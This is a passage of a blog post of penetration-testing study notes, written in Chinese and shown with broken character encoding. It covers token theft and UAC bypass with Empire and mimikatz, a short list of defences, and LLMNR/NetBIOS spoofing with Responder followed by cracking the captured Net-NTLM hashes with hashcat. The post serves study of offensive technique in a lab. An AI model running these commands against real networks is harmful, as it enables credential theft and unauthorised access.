<h3 id="4-5-4-Empireä¸‹çš„ä»¤ç‰Œçªƒå–"><a href="#4-5-4-Empireä¸‹çš„ä»¤ç‰Œçªƒå–" class="headerlink" title="4.5.4 Empireä¸‹çš„ä»¤ç‰Œçªƒå–"></a>4.5.4 <code>Empire</code>ä¸‹çš„ä»¤ç‰Œçªƒå–</h3><p>â€‹        åœ¨<code>Empire</code>ä¸‹è·å–æœåŠ¡å™¨æƒé™åï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®çš„ <code>mimikatz</code> å·¥å…·è·å–ç³»ç»Ÿå¯†ç ã€‚è¿è¡Œ <code>mimikatz</code>ï¼Œè¾“å…¥<code>creds</code>å‘½ä»¤ï¼Œå³å¯æŸ¥çœ‹ <code>Empire</code> åˆ—ä¸¾å‡ºæ¥çš„å¯†ç ï¼š</p>
<pre><code class="hljs powershell">usemodule privesc/bypassuac
<span class="hljs-built_in">set</span> Listener test
run
mimikatz
creds</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131205413922.png" alt="image-20220131205413922"></p>
<p>ä½¿ç”¨<code>pth&lt;ID&gt;</code>å‘½ä»¤ï¼ˆè¿™é‡Œçš„IDå°±æ˜¯<code>creds</code> ä¸‹çš„<code> CredID</code> ï¼‰ï¼Œçªƒå–èº«ä»½ä»¤ç‰Œã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131210226622.png" alt="image-20220131210226622"></p>
<p>ä½¿ç”¨ <code>ps </code>å‘½ä»¤æŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰åŸŸç”¨æˆ·çš„è¿›ç¨‹æ­£åœ¨è¿è¡Œï¼Œå½“å‰å­˜åœ¨åŸŸç”¨æˆ·çš„è¿›ç¨‹ã€‚é€‰æ‹©åç§°ä¸º <code>exploere</code>ã€<code>PID</code> ä¸º 2496 çš„è¿›ç¨‹:</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220131210758443.png" alt="image-20220131210758443"></p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> è·å–è¿™ä¸ªä»¤ç‰Œ</span>
steal_token 
<span class="hljs-meta">#</span><span class="bash"> æ¢å¤ä»¤ç‰Œçš„æƒé™</span>
revtoself</code></pre>



<h3 id="4-5-5-é’ˆå¯¹ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡åˆ†æ"><a href="#4-5-5-é’ˆå¯¹ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡åˆ†æ" class="headerlink" title="4.5.5 é’ˆå¯¹ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡åˆ†æ"></a>4.5.5 é’ˆå¯¹ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡åˆ†æ</h3><p>é’ˆå¯¹ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡æªæ–½å¦‚ä¸‹ã€‚</p>
<ul>
<li>åŠæ—¶å®‰è£…å¾®è½¯æ¨é€çš„è¡¥ä¸ã€‚</li>
<li>å¯¹æ¥è·¯ä¸æ˜çš„æˆ–è€…æœ‰å±é™©çš„è½¯ä»¶ï¼Œæ—¢ä¸è¦åœ¨ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œä¹Ÿä¸è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨ã€‚</li>
<li>å¯¹ä»¤ç‰Œçš„æ—¶æ•ˆæ€§è¿›è¡Œé™åˆ¶ï¼Œä»¥é˜²æ­¢æ•£åˆ—å€¼è¢«ç ´è§£åæ³„éœ²æœ‰æ•ˆçš„ä»¤ç‰Œä¿¡æ¯ã€‚è¶Šæ•æ„Ÿçš„æ•°æ®ï¼Œå…¶ä»¤ç‰Œæ—¶æ•ˆåº”è¯¥è¶ŠçŸ­ã€‚å¦‚æœæ¯ä¸ªæ“ä½œéƒ½ä½¿ç”¨ç‹¬ç«‹çš„ä»¤ç‰Œï¼Œå°±å¯ä»¥æ¯”è¾ƒå®¹æ˜“åœ°å®šä½æ³„éœ²ä»¤ç‰Œçš„æ“ä½œæˆ–ç¯èŠ‚ã€‚</li>
<li>å¯¹äºä»¤ç‰Œï¼Œåº”é‡‡å–åŠ å¯†å­˜å‚¨åŠå¤šé‡éªŒè¯ä¿æŠ¤ã€‚</li>
<li>ä½¿ç”¨åŠ å¯†é“¾è·¯<code>SSL/TLS</code>ä¼ è¾“ä»¤ç‰Œï¼Œä»¥é˜²æ­¢è¢«ä¸­é—´äººçªƒå¬ã€‚</li>
</ul>
<h2 id="4-6-æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™åˆ†æåŠé˜²èŒƒ"><a href="#4-6-æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™åˆ†æåŠé˜²èŒƒ" class="headerlink" title="4.6 æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™åˆ†æåŠé˜²èŒƒ"></a>4.6 æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™åˆ†æåŠé˜²èŒƒ</h2><p>â€‹        åœ¨æœ¬èŠ‚çš„å®éªŒä¸­ï¼Œå‡è®¾å·²ç»è¿›äººç›®æ ‡ç½‘ç»œï¼Œä½†æ²¡æœ‰è·å¾—ä»»ä½•å‡­è¯ï¼Œä½¿ç”¨<code>LLMNR</code> å’Œ <code>NetBIOS</code> æ¬ºéª—æ”»å‡»å¯¹ç›®æ ‡ç½‘ç»œè¿›è¡Œæ¸—é€æµ‹è¯•ã€‚</p>
<h3 id="4-6-1-LLMNR-å’ŒNetBIOSæ¬ºéª—æ”»å‡»çš„åŸºæœ¬æ¦‚å¿µ"><a href="#4-6-1-LLMNR-å’ŒNetBIOSæ¬ºéª—æ”»å‡»çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="4.6.1 LLMNR å’ŒNetBIOSæ¬ºéª—æ”»å‡»çš„åŸºæœ¬æ¦‚å¿µ"></a>4.6.1 <code>LLMNR</code> å’Œ<code>NetBIOS</code>æ¬ºéª—æ”»å‡»çš„åŸºæœ¬æ¦‚å¿µ</h3><h4 id="1-LLMNR"><a href="#1-LLMNR" class="headerlink" title="1.  LLMNR"></a>1.  <code>LLMNR</code></h4><p>â€‹      æœ¬åœ°é“¾è·¯å¤šæ’­åç§°è§£æï¼ˆ<code>LLMNRâ€”Link-Local Multicast Name Resolution</code>ï¼‰æ˜¯ä¸€ç§åŸŸåç³»ç»Ÿæ•°æ®åŒ…æ ¼å¼ã€‚å½“å±€åŸŸç½‘ä¸­çš„ <code>DNS</code> æœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼Œ<code>DNS</code>å®¢æˆ·ç«¯ä¼šä½¿ç”¨<code>LLMNR</code>è§£ææœ¬åœ°ç½‘æ®µä¸­æœºå™¨çš„åç§°ï¼Œç›´åˆ°<code>DNS</code>æœåŠ¡å™¨æ¢å¤æ­£å¸¸ä¸ºæ­¢ã€‚ä» <code>Windows Vista</code> ç‰ˆæœ¬å¼€å§‹æ”¯æŒ <code>LLMNR</code>ã€‚<code>LLMNR</code> æ”¯æŒ <code>IPv6</code>ã€‚</p>
<p><code>LLMNR</code> çš„å·¥ä½œæµç¨‹å¦‚ä¸‹ã€‚</p>
<ol>
<li><code>DNS</code> å®¢æˆ·ç«¯åœ¨è‡ªå·±çš„å†…éƒ¨åç§°ç¼“å­˜ä¸­æŸ¥è¯¢åç§°ã€‚</li>
<li>å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œä¸»æœºå°†å‘ä¸»<code>DNS</code>å‘é€åç§°æŸ¥è¯¢è¯·æ±‚ã€‚</li>
<li>å¦‚æœä¸»<code>DNS</code>æ²¡æœ‰å›åº”æˆ–è€…æ”¶åˆ°äº†é”™è¯¯çš„ä¿¡æ¯ï¼Œä¸»æœºä¼šå‘å¤‡<code>DNS</code>å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚</li>
<li>å¦‚æœå¤‡<code>DNS</code>æ²¡æœ‰å›åº”æˆ–è€…æ”¶åˆ°äº†é”™è¯¯çš„ä¿¡æ¯ï¼Œå°†ä½¿ç”¨<code>LLMNR</code>è¿›è¡Œè§£æã€‚</li>
<li>ä¸»æœºé€šè¿‡ <code>UDP</code> åè®®å‘ç»„æ’­åœ°å€ <strong><code>224.0.0.252</code></strong> çš„ <strong><code>5355</code></strong> ç«¯å£å‘é€å¤šæ’­æŸ¥è¯¢è¯·æ±‚ï¼Œä»¥è·å–ä¸»æœºåæ‰€å¯¹åº”çš„ <code>IP</code> åœ°å€ã€‚æŸ¥è¯¢èŒƒå›´ä»…é™äºæœ¬åœ°å­ç½‘ã€‚</li>
<li>æœ¬åœ°å­ç½‘ä¸­æ‰€æœ‰æ”¯æŒ <code>LLMNR</code> çš„ä¸»æœºåœ¨æ”¶åˆ°æŸ¥è¯¢è¯·æ±‚åï¼Œä¼šå¯¹æ¯”è‡ªå·±çš„ä¸»æœºåã€‚å¦‚æœä¸åŒï¼Œå°±ä¸¢å¼ƒï¼›å¦‚æœç›¸åŒï¼Œå°±å‘æŸ¥è¯¢ä¸»æœºå‘é€åŒ…å«è‡ªå·± <code>IP</code> åœ°å€çš„å•æ’­ä¿¡æ¯ã€‚</li>
</ol>
<h4 id="2-NetBIOS"><a href="#2-NetBIOS" class="headerlink" title="2. NetBIOS"></a>2. <code>NetBIOS</code></h4><p>â€‹        <code>NetBIOS</code>æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œä¸€èˆ¬ç”¨åœ¨ç”±åå‡ å°è®¡ç®—æœºç»„æˆçš„å±€åŸŸç½‘ä¸­ï¼ˆæ ¹æ®<code>NetBIOS</code>åè®®å¹¿æ’­è·å¾—è®¡ç®—æœºåç§°ï¼Œå¹¶å°†å…¶è§£æä¸ºç›¸åº”çš„ <code>IP</code> åœ°å€ï¼‰ã€‚åœ¨ <code>Windows NT</code> ä»¥åç‰ˆæœ¬çš„æ‰€æœ‰æ“ä½œç³»ç»Ÿä¸­å‡å¯ä½¿ç”¨<code>NetBIOS</code>ã€‚ä½†æ˜¯ï¼Œ<code>NetBIOS</code>ä¸æ”¯æŒ<code>IPv6</code>ã€‚</p>
<p><code>NetBIOS</code>æä¾›çš„ä¸‰ç§æœåŠ¡å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>NetBIOS-NS</code>ï¼ˆ<strong>åç§°æœåŠ¡</strong>ï¼‰ï¼šä¸»è¦ç”¨äºåç§°æ³¨å†Œå’Œè§£æï¼Œä»¥å¯åŠ¨ä¼šè¯å’Œåˆ†å‘æ•°æ®æŠ¥ã€‚è¯¥æœåŠ¡éœ€è¦ä½¿ç”¨åŸŸåæœåŠ¡å™¨æ¥æ³¨å†Œ<code>NetBIOS</code>çš„åç§°ã€‚é»˜è®¤ç›‘å¬<code>UDP</code> 137ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>TCP</code> 137 ç«¯å£ã€‚</li>
<li><code>Datagram Distribution Service</code>ï¼ˆ<strong>æ•°æ®æŠ¥åˆ†å‘æœåŠ¡</strong>ï¼‰ï¼šæ— è¿æ¥æœåŠ¡ã€‚è¯¥æœåŠ¡è´Ÿè´£è¿›è¡Œé”™è¯¯æ£€æµ‹å’Œæ¢å¤ï¼Œé»˜è®¤ç›‘å¬ <code>UDP</code> 138 ç«¯å£ã€‚</li>
<li><code>Session Service</code>ï¼ˆ<strong>ä¼šè¯æœåŠ¡</strong>ï¼‰ï¼šå…è®¸ä¸¤å°è®¡ç®—æœºå»ºç«‹è¿æ¥ï¼Œå…è®¸ç”µå­é‚®ä»¶è·¨è¶Šå¤šä¸ªæ•°æ®åŒ…è¿›è¡Œä¼ è¾“ï¼Œæä¾›é”™è¯¯æ£€æµ‹å’Œæ¢å¤æœºåˆ¶ã€‚é»˜è®¤ä½¿ç”¨<code>TCP</code> 139ç«¯å£ã€‚</li>
</ul>
<h4 id="3-Net-NTLM-Hash"><a href="#3-Net-NTLM-Hash" class="headerlink" title="3.  Net-NTLM Hash"></a>3.  <code>Net-NTLM Hash</code></h4><p>â€‹        <code>Net-NTLM Hash</code> ä¸<code>NTLM Hash</code>ä¸åŒã€‚<br>â€‹        <code>NTLM Hash</code>æ˜¯æŒ‡<code>Windows</code>æ“ä½œç³»ç»Ÿçš„<code>Security Account Manager </code>ä¸­ä¿å­˜çš„ç”¨æˆ·å¯†ç æ•£åˆ—å€¼ã€‚<code>NTLM Hash</code>é€šå¸¸ä¿å­˜åœ¨<code>Windows</code>çš„<code>SAM</code>æ–‡ä»¶æˆ–è€…<code>NTDS.DIT</code>æ•°æ®åº“ä¸­ï¼Œç”¨äºå¯¹è®¿é—®èµ„æºçš„ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p>â€‹        <code>Net-NTLM Hash</code> æ˜¯æŒ‡åœ¨ç½‘ç»œç¯å¢ƒä¸­ç»è¿‡ <code>NTLM</code> è®¤è¯çš„æ•£åˆ—å€¼ã€‚æŒ‘æˆ˜/å“åº”éªŒè¯ä¸­çš„â€œ<strong>å“åº”</strong>â€å°±åŒ…å«<code>Net-NTLM Hash</code>ã€‚ä½¿ç”¨<code>Responder</code>æŠ“å–çš„é€šå¸¸å°±æ˜¯<code>Net-NTLM Hash</code>ã€‚æ”»å‡»è€…æ— æ³•ä½¿ç”¨è¯¥æ•£åˆ—å€¼è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œåªèƒ½åœ¨ä½¿ç”¨<code>Hashcat</code>ç­‰å·¥å…·å¾—åˆ°æ˜æ–‡åè¿›è¡Œæ¨ªå‘ç§»åŠ¨æ”»å‡»ã€‚</p>
<h3 id="4-6-2-LLMNRå’ŒNetBIOSæ¬ºéª—æ”»å‡»åˆ†æ"><a href="#4-6-2-LLMNRå’ŒNetBIOSæ¬ºéª—æ”»å‡»åˆ†æ" class="headerlink" title="4.6.2 LLMNRå’ŒNetBIOSæ¬ºéª—æ”»å‡»åˆ†æ"></a>4.6.2 <code>LLMNR</code>å’Œ<code>NetBIOS</code>æ¬ºéª—æ”»å‡»åˆ†æ</h3><p>â€‹        å‡è®¾ç›®æ ‡ç½‘ç»œçš„<code>DNS</code>æœåŠ¡å™¨å› å‘ç”Ÿæ•…éšœè€Œæ— æ³•æä¾›æœåŠ¡æ—¶ï¼Œä¼šé€€å›<code>LLMNR</code>å’Œ<code>NBT-NS</code>è¿›è¡Œè®¡ç®—æœºåè§£æã€‚ä¸‹é¢ä½¿ç”¨<code>Responder</code>å·¥å…·è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚<code>Responder</code>æ˜¯ç›‘å¬<code>LLMNR</code>å’Œ<code>NBT-NS</code>åè®®çš„å·¥å…·ä¹‹ä¸€ï¼Œèƒ½å¤ŸæŠ“å–ç½‘ç»œä¸­æ‰€æœ‰çš„<code>LLMNR</code>å’Œ<code>NBT-NS</code>è¯·æ±‚å¹¶è¿›è¡Œå“åº”ï¼Œè·å–æœ€åˆçš„è´¦æˆ·å‡­è¯ã€‚<code>Responder</code>å¯ä»¥åˆ©ç”¨å†…ç½®<code>SMB</code>è®¤è¯æœåŠ¡å™¨ã€<code>MSSQL</code>è®¤è¯æœåŠ¡å™¨ã€<code>HTTP</code>è®¤è¯æœåŠ¡å™¨ã€<code>HTTPS</code>è®¤è¯æœåŠ¡å™¨ã€<code>LDAP</code> è®¤è¯æœåŠ¡å™¨ã€<code>DNS</code>æœåŠ¡å™¨ã€<code>WPAD</code> ä»£ç†æœåŠ¡å™¨ï¼Œä»¥åŠ <code>FTP</code>ã€<code>POP3</code>ã€<code>IMAP</code>ã€<code>SMTP</code> ç­‰æœåŠ¡å™¨ï¼Œæ”¶é›†ç›®æ ‡ç½‘ç»œä¸­è®¡ç®—æœºçš„å‡­æ®ï¼Œè¿˜å¯ä»¥é€šè¿‡ <code>Multi-Relay</code> åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>â€‹        <code>NetBIOS</code>æ˜¯ä» <code>Windows 2000</code> å¼€å§‹å¯ç”¨çš„ï¼Œ<code>LLNNR</code> æ˜¯ä½œä¸º <code>windows Vista</code>ä»¥ä¸Šçš„ç³»ç»Ÿå¼€å§‹å¯ç”¨çš„åè®®ï¼Œè¿˜æœ‰å°±æ˜¯ <code>NetBIOS</code>æ˜¯Windowsè¿›è¡Œé€šä¿¡çš„APIï¼ŒLLMNRæ˜¯ç½‘ç»œåè®®ï¼Œä½†æ˜¯ä¸¤è€…ä¸»è¦åŠŸèƒ½æ˜¯ä¸€æ ·çš„ã€‚åœ¨ç³»ç»Ÿè¿›è¡Œåç§°è§£æä¼šè¿›è¡Œä»¥ä¸‹çš„æ­¥éª¤ï¼š</p>
<ol>
<li>æ£€æŸ¥ä»¥ç¡®è®¤è¯·æ±‚æ˜¯å¦é’ˆå¯¹æœ¬åœ°è®¡ç®—æœºåç§°ã€‚</li>
<li>æ£€æŸ¥æœ€è¿‘æˆåŠŸè§£æçš„åç§°çš„æœ¬åœ°ç¼“å­˜ã€‚</li>
<li>æœç´¢æœ¬åœ°hostsæ–‡ä»¶å½“ä¸­è§£æã€‚</li>
<li>æŸ¥è¯¢ DNS æœåŠ¡å™¨ã€‚</li>
<li>å¦‚æœå¯ç”¨äº† LLMNRï¼Œåˆ™åœ¨æœ¬åœ°å­ç½‘ä¸­å¹¿æ’­ LLMNR æŸ¥è¯¢ä»¥è¯·æ±‚å…¶å¯¹ç­‰æ–¹è¿›è¡Œè§£æã€‚</li>
<li>å¦‚æœå¯ç”¨äº† NetBIOSï¼Œå¦‚æœåç§°ä¸åœ¨æœ¬åœ° NetBIOS ç¼“å­˜ä¸­ï¼Œåˆ™å°è¯•é€šè¿‡å‘æœ¬åœ°å­ç½‘å¹¿æ’­ NetBIOS-NS æŸ¥è¯¢æ¥è§£æ NetBIOS åç§°ã€‚å¦‚æœè¿™æ ·é…ç½®ï¼Œæ­¤æ­¥éª¤å¯èƒ½ä¼šä½¿ç”¨ Windows Internet åç§°æœåŠ¡ (WINS) æœåŠ¡å™¨ä»¥åŠ LAN ç®¡ç†å™¨ä¸»æœº (LMHOSTS) æ–‡ä»¶ã€‚</li>
</ol>
<p><strong>WPAD:</strong></p>
<p><strong>Web ä»£ç†è‡ªåŠ¨å‘ç° (WPAD) åè®®</strong>æ˜¯ç»„ç»‡å…è®¸å‘˜å·¥é€šè¿‡ä»£ç†æœåŠ¡å™¨è®¿é—®äº’è”ç½‘ï¼Œä»¥æé«˜æ€§èƒ½ã€ç¡®ä¿å®‰å…¨å’Œè·Ÿè¸ªæµé‡ã€‚è¿æ¥åˆ°å…¬å¸ç½‘ç»œçš„ç”¨æˆ·éœ€è¦çŸ¥é“ç‰¹å®š URL çš„ä»£ç†æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨ DHCP å’Œ/æˆ– DNS å‘ç°æ–¹æ³•æ¥å®šä½é…ç½®æ–‡ä»¶çš„ URL çš„ä¸€ç§æ–¹æ³•ã€‚ ä¸€æ—¦é…ç½®æ–‡ä»¶çš„æ£€æµ‹å’Œä¸‹è½½å®Œæˆï¼Œå°±å¯ä»¥æ‰§è¡Œå®ƒæ¥ç¡®å®šæŒ‡å®š URL çš„ä»£ç†ã€‚åœ¨IEåœ¨ç½‘ç»œè®¾ç½®æ‰“å‹¾å°±è¡¨ç¤ºå¯ç”¨äº†wpadï¼Œé»˜è®¤æ˜¯ä¸å¼€å¯çš„ï¼Œä½†æ˜¯åœ¨ Windows 10 ä¸­WPAD é»˜è®¤æ˜¯å¯ç”¨çš„ã€‚</p>
<h5 id="1-ä¸‹è½½å’Œè¿è¡Œ"><a href="#1-ä¸‹è½½å’Œè¿è¡Œ" class="headerlink" title="1.ä¸‹è½½å’Œè¿è¡Œ"></a>1.ä¸‹è½½å’Œè¿è¡Œ</h5><p><code>Responder</code>æ˜¯ä½¿ç”¨<code>Python</code>è¯­è¨€ç¼–å†™çš„ï¼Œ<code>repo</code>ï¼š<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<h5 id="2-ç›‘å¬æ¨¡å¼"><a href="#2-ç›‘å¬æ¨¡å¼" class="headerlink" title="2. ç›‘å¬æ¨¡å¼"></a>2. ç›‘å¬æ¨¡å¼</h5><p>è¿›äººç›®æ ‡ç½‘ç»œåï¼Œå¦‚æœæ²¡æœ‰è·å¾—ä»»ä½•ç›®æ ‡ç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯å’Œé‡è¦å‡­è¯ï¼Œå¯ä»¥å¼€å¯ <code>Responder</code> çš„ç›‘å¬æ¨¡å¼ã€‚<code>Responder</code> åªä¼šå¯¹ç½‘ç»œä¸­çš„æµé‡è¿›è¡Œåˆ†æï¼Œä¸ä¼šä¸»åŠ¨å“åº”ä»»ä½•è¯·æ±‚ã€‚ä½¿ç”¨<code>Responder</code>æŸ¥çœ‹ç½‘ç»œæ˜¯å¦‚ä½•åœ¨æ²¡æœ‰ä¸»åŠ¨å®šä½ä»»ä½•ä¸»æœºçš„æƒ…å†µä¸‹è¿è¡Œçš„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<pre><code class="hljs bash"><span class="hljs-comment"># kaliæ‰§è¡Œ</span>
responder -I eth0  --lm -Pv</code></pre>

<p><code>ON</code>ä»£è¡¨é’ˆå¯¹è¯¥æœåŠ¡æ•°æ®åŒ…çš„ç›‘å¬ï¼Œ<code>OFF</code>ä»£è¡¨å…³é—­ç›‘å¬ã€‚ç”±æ­¤å¯ä»¥åˆ†æå‡ºç½‘ç»œä¸­å­˜åœ¨çš„<code>IP</code>åœ°å€æ®µã€æœºå™¨åç­‰ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220622001954594.png" alt="image-20220622001954594" style="zoom:50%;" />



<h5 id="3-æ¸—é€æµ‹è¯•"><a href="#3-æ¸—é€æµ‹è¯•" class="headerlink" title="3. æ¸—é€æµ‹è¯•"></a>3. æ¸—é€æµ‹è¯•</h5><p>â€‹        åœ¨ä½¿ç”¨ <code>Responder</code> å¯¹ç½‘ç»œè¿›è¡Œåˆ†æä¹‹åï¼Œå¯ä»¥åˆ©ç”¨<code>SMB</code>åè®®è·å–ç›®æ ‡ç½‘ç»œä¸­è®¡ç®—æœºçš„<code>Net-NTLM Hash</code>ã€‚å¦‚æœç”¨æˆ·è¾“å…¥äº†é”™è¯¯çš„è®¡ç®—æœºåï¼Œåœ¨<code>DNS</code>æœåŠ¡å™¨ä¸Šè¿›è¡Œçš„åç§°æŸ¥è¯¢æ“ä½œå°†ä¼šå¤±è´¥ï¼Œåç§°è§£æè¯·æ±‚å°†è¢«é€€å›ï¼Œä½¿ç”¨<code>NBT-NS</code>å’Œ<code>LLMNR</code>è¿›è¡Œè§£æã€‚</p>
<p>â€‹        åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œä½¿ç”¨<code>Responder</code>å¹¶å¯åŠ¨å›åº”è¯·æ±‚åŠŸèƒ½ï¼Œ<code>Responder</code>ä¼šè‡ªåŠ¨å›åº”å®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶å£°æ˜è‡ªå·±å°±æ˜¯è¢«è¾“å…¥äº†é”™è¯¯è®¡ç®—æœºåçš„é‚£å°æœºå™¨ï¼Œç„¶åå°è¯•å»ºç«‹<code>SMB</code>è¿æ¥ã€‚å®¢æˆ·ç«¯ä¼šå‘é€è‡ªå·±çš„ <code>Net-NTLM Hash</code> è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ­¤æ—¶å°†å¾—åˆ°ç›®æ ‡æœºå™¨çš„ <code>Net-NTLM Hash</code>ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p>Windows 7 è®¿é—®å…±äº«æœåŠ¡ï¼š</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220622001712801.png" alt="image-20220622001712801" style="zoom:50%;" />

<p>å¯ä»¥çœ‹åˆ°è®¿é—®ä¹‹åæŠ“å–åˆ°è®¤è¯å‡­æ®ï¼š</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220622001930793.png" alt="image-20220622001930793"></p>
<p>ä¿å­˜å‡­æ®ä¸ºhash.txtï¼Œä½¿ç”¨hashcatè¿›è¡Œçˆ†ç ´ï¼š</p>
<pre><code class="hljs bash"><span class="hljs-comment"># æˆåŠŸçˆ†ç ´å‡ºå¯†ç ä¸º123</span>
hashcat -m 5600 hash.txt passwd.txt</code></pre>

<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220622002313653.png" alt="image-20220622002313653" style="zoom:50%;" />

        </div>

    </div>

    

    

    

    
  <div class="article-copyright hairline">
    <p>
      æœ¬ä½œå“é‡‡ç”¨  <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç¦æ­¢æ¼”ç» 4.0 å›½é™…è®¸å¯åè®® (CC BY-NC-ND 4.0)</a> è¿›è¡Œè®¸å¯ã€‚
    </p>
  </div>
  

    

    
<nav class="article-nav">
  
    <a href="/fd778797.html" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-caption">ä¸‹ä¸€ç¯‡</div>
      <div class="article-nav-title">
        
          Xrayæ‰«æç»“æœæ•´ç†å°è„šæœ¬åˆ†äº«
        
      </div>
    </a>
  
  
    <a href="/ddad802f.html" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-caption">ä¸Šä¸€ç¯‡</div>
      <div class="article-nav-title">2021-12æœˆCISP-PTEè€ƒè¯•æ€»ç»“</div>
    </a>
  
</nav>


    <section class="share">
        <div class="share-title">åˆ†äº«</div>
        <a class="share-item" target="_blank"
            href="https://twitter.com/share?text=å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ - RainMaker&url=http%3A%2F%2Fhasaki-h2.github.io%2F401ba385.html">
            <ion-icon name="logo-twitter"></ion-icon>
        </a>
        <a class="share-item" target="_blank"
            href="https://www.facebook.com/sharer.php?title=å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ - RainMaker&u=http%3A%2F%2Fhasaki-h2.github.io%2F401ba385.html">
            <ion-icon name="logo-facebook"></ion-icon>
        </a>
        <!-- <a class="share-item" target="_blank"
            href="https://service.weibo.com/share/share.php?title=å†…ç½‘å­¦ä¹ ç¬”è®°å›› | æƒé™æå‡åˆ†æåŠé˜²å¾¡ - RainMaker&url=http://hasaki-h2.github.io/401ba385.html&pic=">
            <div class="n-icon n-icon-weibo"></div>
        </a> -->
    </section>

</article>










<section class="comments">
    <div id="valine-container"></div>
</section>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>







<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

</div>
                </section>
            </section>

            
            <aside class="sidebar sidebar-search-fix">
                

    <div class="search">
    <div class="has-icon-right">
        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
        <div class="form-icon">
            <ion-icon name="search"></ion-icon>
        </div>
    </div>
    <div class="search-result" id="search-ps"></div>
</div>


<div class="widget" id="widget">
    
      
  <div class="widget-wrap">
    <div class="widget-inner">
      <div class="toc post-toc-html"></div>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-cate">
    <div class="widget-title"><span>Categories</span></div>
    <div class="widget-inner">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Webæ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">å…¶ä»–</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">å†…ç½‘æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">å·¥å…·ä½¿ç”¨</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">å¼€å‘è¯­è¨€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">æ“ä½œç³»ç»Ÿ</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">æ•°æ®åº“</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">æ¨ªå‘ç§»åŠ¨</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">æº¯æºååˆ¶</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">æ¼æ´å¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">ç¯å¢ƒé…ç½®</a></li><li 